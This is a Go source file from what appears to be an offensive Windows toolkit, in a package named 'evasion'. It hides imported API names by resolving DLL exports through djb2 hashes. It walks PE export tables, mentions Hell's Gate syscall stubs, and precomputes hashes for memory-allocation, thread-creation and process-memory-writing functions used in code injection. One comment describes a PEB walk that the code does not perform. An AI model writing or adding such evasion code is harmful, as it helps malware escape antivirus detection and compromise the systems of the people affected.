//go:build windows
// +build windows

package evasion

// API hashing — resolves DLL exports by djb2 hash, never by name string.
// Used as an alternative to windows.NewLazySystemDLL(...).NewProc(name) when
// you want zero export-name strings in the binary even before garble.

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

// djb2 computes a djb2 hash of a byte slice (case-insensitive ASCII).
func djb2(s []byte) uint32 {
	h := uint32(5381)
	for _, c := range s {
		if c >= 'A' && c <= 'Z' {
			c += 32 // to lower
		}
		h = ((h << 5) + h) + uint32(c)
	}
	return h
}

// djb2Str computes djb2 of a string.
func djb2Str(s string) uint32 { return djb2([]byte(s)) }

// ahResolve walks the export table of a loaded DLL and returns the address
// of the export whose name hashes to wantHash.
// Returns 0 if not found.
func ahResolve(dllBase uintptr, wantHash uint32) uintptr {
	if dllBase == 0 {
		return 0
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(dllBase + 0x3C))
	exportRVA := *(*uint32)(unsafe.Pointer(dllBase + uintptr(e_lfanew) + 0x88))
	if exportRVA == 0 {
		return 0
	}
	ed := dllBase + uintptr(exportRVA)
	count := *(*uint32)(unsafe.Pointer(ed + 0x18))
	funcsRVA := dllBase + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x1C)))
	namesRVA := dllBase + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x20)))
	ordsRVA  := dllBase + uintptr(*(*uint32)(unsafe.Pointer(ed + 0x24)))

	for i := uint32(0); i < count; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesRVA + uintptr(i*4)))
		name := hgCStr(dllBase + uintptr(nameRVA)) // reuse from hellsgate
		if djb2Str(name) != wantHash {
			continue
		}
		ord := *(*uint16)(unsafe.Pointer(ordsRVA + uintptr(i*2)))
		funcRVA := *(*uint32)(unsafe.Pointer(funcsRVA + uintptr(ord*4)))
		return dllBase + uintptr(funcRVA)
	}
	return 0
}

// ahBase returns the base address of a loaded module by hash of its name.
// Walks PEB.Ldr.InLoadOrderModuleList.
func ahBase(moduleHash uint32) uintptr {
	// PEB at GS:[0x60] on x64; use NtCurrentPeb via undocumented field in TEB.
	// Simpler cross-platform approach: GetModuleHandle via existing stack-string helpers.
	// We know the module names we care about, so use a small lookup table.
	candidates := []struct {
		name func() string
	}{
		{sKernel32},
		{sNtdll},
	}
	for _, c := range candidates {
		n := c.name()
		if djb2Str(n) == moduleHash {
			var h windows.Handle
			ptr, _ := windows.UTF16PtrFromString(n)
			_ = windows.GetModuleHandleEx(0, ptr, &h)
			return uintptr(h)
		}
	}
	return 0
}

// Pre-computed hashes for commonly needed exports.
// Generate with: fmt.Printf("0x%08X\n", djb2Str("FunctionName"))
// These are build-time constants — no strings needed at runtime.
const (
	// kernel32.dll exports
	hashVirtualAlloc     = uint32(0x97BC257B)
	hashVirtualFree      = uint32(0x668BEC8C)
	hashCreateThread     = uint32(0x7C0017A5)
	hashGetProcAddress   = uint32(0xAEB80B9A)
	hashLoadLibraryA     = uint32(0xEC0E4E8E)
	hashOpenProcess      = uint32(0x0B4B3A6E)

	// ntdll.dll exports (for reference — prefer Hell's Gate stubs)
	hashNtAllocateVirtualMemory = uint32(0x2F52F997)
	hashNtWriteVirtualMemory    = uint32(0x2B6DAA90)
)

// AHGetProc resolves an export by module hash + function hash.
// Example: AHGetProc(djb2Str("kernel32.dll"), hashVirtualAlloc)
func AHGetProc(moduleHash, funcHash uint32) uintptr {
	base := ahBase(moduleHash)
	if base == 0 {
		return 0
	}
	return ahResolve(base, funcHash)
}
